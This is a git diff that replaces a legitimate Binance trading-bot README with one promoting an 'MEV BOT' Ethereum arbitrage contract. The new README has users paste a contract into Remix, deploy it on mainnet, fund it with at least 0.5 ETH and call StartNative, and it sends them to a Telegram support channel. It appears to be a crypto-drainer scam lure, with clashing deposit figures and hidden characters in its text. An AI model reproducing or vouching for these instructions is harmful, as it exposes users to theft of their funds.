@@ -1,161 +1,81 @@
-# Binance Trader (RC 2)
+# MEV-BOT
 
-This is an experimental bot for auto trading the binance.com exchange. [@yasinkuyu](https://twitter.com/yasinkuyu)
+## Overview
+Welcome to the **MEV BOT** GitHub repository! This project is designed to help users easily deploy and manage a smart contract for Ethereum that performs arbitrage operations with a minimum deposit requirement.
 
-![Screenshot](https://github.com/yasinkuyu/binance-trader/blob/master/img/screenshot.png)
+## Features
+- **Easy to Use**: Simple deployment and management.
+- **Secure**: Ensures a minimum deposit of 1 ETH.
+- **Optimized**: Efficient use of gas and resources.
 
-## Configuration
+## Important Note
+This smart contract is designed to operate on the Ethereum mainnet and does not work on testnets due to specific dependencies and functionalities that are only present on the mainnet.
 
-1. [Signup](https://www.binance.com/?ref=10701111) for Binance
-2. Enable Two-factor Authentication
-3. Go API Center, [Create New](https://www.binance.com/en/my/settings/api-management?ref=10701111) Api Key
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Important Note](#important-note)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#Support)
+- [Help](#Help)
+- [License](#license)
 
-        [✓] Read Info [✓] Enable Trading [X] Enable Withdrawals
+## Installation
 
-4. Rename **config.sample.py** to `config.py` / **orders.sample.db** to `orders.db`
-5. Get an API and Secret Key, insert into `config.py`
+### Deploying with Remix IDE
 
-        API key for account access
-        api_key = ''
-        Secret key for account access
-        api_secret = ''
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+   Access the  [**Remix IDE**](https://remix.ethereum.org)(this website is where we deploy the smart contract).
 
-        [API Docs](https://www.binance.com/restapipub.html)
+2. **Create a New File**:
+   Click on the **File Explorers** tab, then click on **Create New File** and name it `MevBot.sol`.
 
-6. Optional: Modify recv_window value (not recommended)
 
-7. Optional: run as an excutable application in Docker containers
+3. **Copy the Contract Code**:
+   [**Copy the entire contract code**](MevBot.sol) from this repository and paste it into `MevBot.sol`.
+
+4. **Compile the Contract**:
+   Click on the **Solidity Compiler** tab, select the appropriate compiler version 0.6.12, and click on **Compile MevBot.sol**.
+
+
+5. **Deploy the Contract**:
+   - Click on the **Deploy & Run Transactions** tab.
+   - Select `Injected Web3` as the environment to connect to MetaMask.
+   - Ensure you are connected to the Ethereum mainnet in MetaMask.
+   - Click on the **Deploy** button.
+
+6. **Confirm Deployment**:
+   Confirm the deployment transaction in MetaMask. Make sure you have enough ETH in your wallet to cover the gas fees and the minimum deposit requirement.
+
+### Using the Contract
+
+1. **Deposit ETH**:
+   Ensure that the contract has at least 0.5 ETH deposited. You can send ETH to the contract address directly from your wallet.
+
+2. **Start Arbitrage**:
+   Use the `StartNative` function to initiate the arbitrage process.
+
+3. **Monitor Transactions**:
+   Monitor your transactions and profits using a block explorer like [**Etherscan.io**](https://etherscan.io/).
+
+## Usage
+
+### Start Arbitrage Operation
+1. **Ensure sufficient funds**:
+   We recommend funding the contract with at least 0.5-2 ETH or higher to cover gas fees and possible burn fees. Bot targets to­ken c­ontr­a­cts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
+
+2. **Call `StartNative`**:
+   Call the `StartNative` function to start the arbitrage process. You can do this directly from Remix or using any Ethereum wallet that supports contract interactions.
 
 ## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-[https://www.binance.com/?ref=10701111](https://www.binance.com/?ref=10701111)
-
-## Requirements
-
-    sudo pip install requests
-
-    Python 3
-        import os
-        import sys
-        import time
-        import config
-        import argparse
-        import threading
-        import sqlite3
-
-## Usage (trading module)
-
-    python trader.py --symbol XVGBTC
-
-    Example parameters
-
-    # Profit mode (default)
-    python trader.py --symbol XVGBTC --quantity 300 --profit 1.3
-    or by amount
-    python trader.py --symbol XVGBTC --amount 0.0022 --profit 3
-
-    # Range mode
-    python trader.py --symbol XVGBTC --mode range --quantity 300 --buyprice 0.00000780 --sellprice 0.00000790
-    or by amount
-    python trader.py --symbol XVGBTC --mode range --amount 0.0022 --buyprice 0.00000780 --sellprice 0.00000790
-
-    --quantity     Buy/Sell Quantity (default 0) (If zero, auto calc)
-    --amount       Buy/Sell BTC Amount (default 0)
-    --symbol       Market Symbol (default XVGBTC or XVGETH)
-    --profit       Target Profit Percentage (default 1.3)
-    --stop_loss    Decrease sell price at loss Percentage (default 0)
-    --orderid      Target Order Id (default 0)
-    --wait_time    Wait Time (seconds) (default 0.7)
-    --increasing   Buy Price Increasing  +(default 0.00000001)
-    --decreasing   Sell Price Decreasing -(default 0.00000001)
-    --prints       Scanning Profit Screen Print (default True)
-    --loop         Loop (default 0 unlimited)
-
-    --mode         Working modes profit or range (default profit)
-                   profit: Profit Hunter. Find defined profit, buy and sell. (Ex: 1.3% profit)
-                   range: Between target two price, buy and sell. (Ex: <= 0.00000780 buy - >= 0.00000790 sell )
-
-    --buyprice     Buy price (Ex: 0.00000780)
-    --sellprice    Buy price (Ex: 0.00000790)
-
-    Symbol structure;
-        XXXBTC  (Bitcoin)
-        XXXETH  (Ethereum)
-        XXXBNB  (Binance Coin)
-        XXXUSDT (Tether)
-
-    All binance symbols are supported.
-
-    Every coin can be different in --profit and --quantity.
-    If quantity is empty --quantity is automatically calculated to the minimum qty.
-
-    Variations;
-        trader.py --symbol TBNBTC --quantity 50 --profit 3
-        trader.py --symbol NEOBTC --amount 0.1 --profit 1.1
-        trader.py --symbol ETHUSDT --quantity 0.3 --profit 1.5
-        ...
-
-## Usage (balances module)
-
-    python balance.py
-
-## Run in a Docker container
-
-    docker build -t trader .
-
-    docker run trader
-
-## DISCLAIMER
-
-    I am not responsible for anything done with this bot.
-    You use it at your own risk.
-    There are no warranties or guarantees expressed or implied.
-    You assume all responsibility and liability.
-
-## Contributing
-
-    Fork this Repo
-    Commit your changes (git commit -m 'Add some feature')
-    Push to the changes (git push)
-    Create a new Pull Request
-
-    Thanks all for your contributions...
-
-    Contributors
-        @WeSpeakCrypto
-        @afoke
-        @omerfarukz
-        @plgonzalezrx8
-
-## Troubleshooting
-
-    Filter failure: MIN_NOTIONAL
-    https://support.binance.com/hc/en-us/articles/115000594711-Trading-Rule
-
-    Filter failure: PRICE_FILTER
-    https://github.com/binance-exchange/binance-official-api-docs/blob/master/rest-api.md
-
-    Timestamp for this request was 1000ms ahead of the server's time.
-    https://github.com/yasinkuyu/binance-trader/issues/63#issuecomment-355857901
-
-## Roadmap
-
-    - MACD indicator (buy/sell)
-    - Stop-Loss implementation
-    - Working modes
-      - profit: Find defined profit, buy and sell. (Ex: 1.3% profit)
-      - range:  Between target two price, buy and sell. (Ex: <= 0.00100 buy - >= 0.00150 sell )
-    - Binance/Bittrex/HitBTC Arbitrage  
-
-    ...
-
-    - October 7, 2017 Beta
-    - January 6, 2018 RC
-    - January 15, 2018 RC 1
-    - January 20, 2018 RC 2
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
 
 ## License
 
-Code released under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
----
+
